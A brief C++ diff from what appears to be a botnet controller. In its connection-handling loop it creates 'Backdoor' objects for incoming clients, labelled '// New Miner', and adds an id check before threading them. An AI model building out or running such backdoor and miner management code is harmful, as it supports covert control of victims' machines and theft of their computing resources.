@@ -94,7 +94,10 @@ void Communication::listen_forever(){
         char * client_ip = inet_ntoa(address.sin_addr);
         int port = ntohs(address.sin_port);
 
+        // New Miner
         Backdoor b(new_socket, this, true, client_ip);
+        std::string id = b.get_id();
+        check_id(id);
         this->threads.push_back(std::thread(b));
         this->backdoors.push_back(b);
     }
